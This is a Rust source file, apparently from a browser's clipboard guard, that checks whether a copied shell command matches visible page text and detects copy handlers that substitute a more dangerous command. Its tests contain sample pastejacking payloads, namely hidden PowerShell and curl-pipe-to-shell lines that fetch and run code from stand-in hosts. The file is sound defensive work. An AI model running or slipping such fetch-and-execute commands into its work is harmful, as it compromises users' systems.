/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

//! Is the command on screen? Did the page change what the person selected?
//!
//! The browser collects the text of the page's visible elements that contain parts of
//! the command (the WhisperClipguard window actor; elements hidden by CSS, too small,
//! transparent or outside the page are left out). Here every line of the command must
//! appear in that text. Before comparing, both sides lose whitespace, case and
//! typographic differences, and the command loses shell prompts ("$ ", "PS C:\> ") and
//! line continuations; a copy button that drops prompts or output lines still matches,
//! a command with one line more than the page shows does not.

use memchr::memmem;

use crate::normalize::fold_for_compare;
use crate::{classify, Level};

/// Longest probe sent to the page.
const MAX_PROBE_LEN: usize = 64;
/// At most this many probes.
const MAX_PROBES: usize = 4;

/// Removes a shell prompt at the start of a line of the command.
fn strip_prompt(line: &str) -> &str {
    let t = line.trim_start();
    for p in ["$ ", "% ", "> ", "\u{276f} ", "\u{279c} "] {
        if let Some(rest) = t.strip_prefix(p) {
            return rest;
        }
    }
    // PowerShell ("PS> ", "PS C:\dev\app> ") and cmd ("C:\dev\app>") prompts.
    if let Some(gt) = t.find("> ") {
        let head = &t[..gt];
        let is_ps = head == "ps" || head.starts_with("ps ");
        let is_drive = head.len() >= 2
            && head.as_bytes()[0].is_ascii_alphabetic()
            && head.as_bytes()[1] == b':'
            && !head.contains(' ');
        if is_ps || is_drive {
            return &t[gt + 2..];
        }
    }
    t
}

/// A line without whitespace and without a line continuation at its end.
fn squeeze(line: &str) -> String {
    let t = line.trim_end();
    let t = t
        .strip_suffix('\\')
        .or_else(|| t.strip_suffix('`'))
        .or_else(|| t.strip_suffix('^'))
        .unwrap_or(t);
    t.chars().filter(|c| !c.is_whitespace()).collect()
}

/// The command's lines as they are compared.
fn command_lines(command: &str) -> Vec<String> {
    fold_for_compare(command)
        .lines()
        .map(|l| squeeze(strip_prompt(l)))
        .filter(|l| !l.is_empty())
        .collect()
}

/// A candidate text as it is compared: all lines, squeezed and joined.
fn candidate_text(candidate: &str) -> String {
    fold_for_compare(candidate).lines().map(squeeze).collect()
}

/// Whether every line of `command` appears in the visible page text `candidates`
/// (texts of elements the browser found visible). A command without any visible
/// character counts as visible.
pub fn is_visible<S: AsRef<str>>(command: &str, candidates: &[S]) -> bool {
    let lines = command_lines(command);
    if lines.is_empty() {
        return true;
    }
    let texts: Vec<String> = candidates
        .iter()
        .map(|c| candidate_text(c.as_ref()))
        .collect();
    lines.iter().all(|line| {
        let finder = memmem::Finder::new(line.as_bytes());
        texts.iter().any(|t| finder.find(t.as_bytes()).is_some())
    })
}

/// Short pieces of the command the browser looks for on the page to find the elements
/// worth comparing: the longest words of its lines, made only of characters that pages
/// show unchanged (letters, digits and `./:_-=+@%~`). Falls back to the start of the
/// first line.
pub fn visibility_probes(command: &str) -> Vec<String> {
    let mut words: Vec<&str> = Vec::new();
    for line in command.lines() {
        let best = strip_prompt(line)
            .split_whitespace()
            .map(|w| w.trim_matches(|c: char| "\"'`();,".contains(c)))
            .filter(|w| {
                w.len() >= 4
                    && w.chars()
                        .all(|c| c.is_ascii_alphanumeric() || "./:_-=+@%~".contains(c))
            })
            .max_by_key(|w| w.len());
        if let Some(w) = best {
            if !words.contains(&w) {
                words.push(w);
            }
        }
    }
    words.sort_by_key(|w| std::cmp::Reverse(w.len()));
    let mut probes: Vec<String> = words
        .into_iter()
        .take(MAX_PROBES)
        .map(|w| truncate(w, MAX_PROBE_LEN).to_owned())
        .collect();
    if probes.is_empty() {
        let first = command.lines().map(str::trim).find(|l| !l.is_empty());
        if let Some(first) = first {
            probes.push(truncate(first, MAX_PROBE_LEN).to_owned());
        }
    }
    probes
}

fn truncate(s: &str, max: usize) -> &str {
    crate::normalize::bounded(s, max)
}

/// For a copy where the page's `copy` handler replaced what the person selected: whether
/// the page made it worse. That is the case when the clipboard text is at `clip_level`
/// (at least LOW), is not part of the selection, and the selection on its own is at a
/// lower level. A handler that only tidies the selection or adds a source line is not a
/// substitution.
pub fn is_substitution(selection: &str, clipboard: &str, clip_level: Level) -> bool {
    if clip_level == Level::None {
        return false;
    }
    if classify(selection).level >= clip_level {
        return false;
    }
    !is_visible(clipboard, &[selection])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn matches_across_prompts_wrapping_and_highlighting() {
        let page = ["$ curl -fsSL https://bun.sh/install \\\n    | bash\nInstalling…"];
        assert!(is_visible(
            "curl -fsSL https://bun.sh/install | bash",
            &page
        ));
        assert!(is_visible(
            "curl -fsSL https://bun.sh/install | bash\n",
            &page
        ));
        assert!(is_visible(
            "PS C:\\> irm get.scoop.sh | iex",
            &["irm get.scoop.sh | iex"]
        ));
        assert!(is_visible("CURL x", &["curl x"]));
    }

    #[test]
    fn copy_button_that_drops_output_lines_still_matches() {
        let page = ["$ npm install\nadded 1 package\n$ npm test\nok"];
        assert!(is_visible("npm install\nnpm test", &page));
    }

    #[test]
    fn an_extra_line_or_a_changed_line_is_not_visible() {
        let page = ["curl -fsSL https://bun.sh/install | bash"];
        assert!(!is_visible(
            "curl -fsSL https://bun.sh/install | bash\ncurl -s https://e.invalid/x | sh",
            &page
        ));
        assert!(!is_visible(
            "curl -fsSL https://bun.sh/install.evil | bash",
            &page
        ));
        assert!(!is_visible("anything", &[] as &[&str]));
    }

    #[test]
    fn invisible_and_typographic_differences_do_not_matter() {
        assert!(is_visible(
            "iwr \u{2013}useb get.scoop.sh",
            &["iwr -useb get.\u{200b}scoop.sh"]
        ));
    }

    #[test]
    fn probes_are_long_plain_words() {
        assert_eq!(
            visibility_probes("$ curl -fsSL https://bun.sh/install | bash"),
            vec!["https://bun.sh/install"]
        );
        assert_eq!(visibility_probes("ls"), vec!["ls"]);
        assert!(visibility_probes("").is_empty());
        let many = "aaaa1\nbbbbbb2\ncccccccc3\ndddddddddd4\neeeeeeeeeeee5";
        assert_eq!(visibility_probes(many).len(), MAX_PROBES);
    }

    #[test]
    fn substitution_needs_a_more_dangerous_text_than_the_selection() {
        assert!(is_substitution(
            "Hello world",
            "powershell -w hidden -c \"iwr https://e.invalid/a | iex\"",
            Level::High
        ));
        let cmd = "curl -fsSL https://bun.sh/install | bash";
        assert!(!is_substitution(cmd, &format!("{cmd}\n"), Level::Med));
        assert!(!is_substitution(
            "some text",
            "some text\nRead more: https://example.invalid",
            Level::None
        ));
    }
}
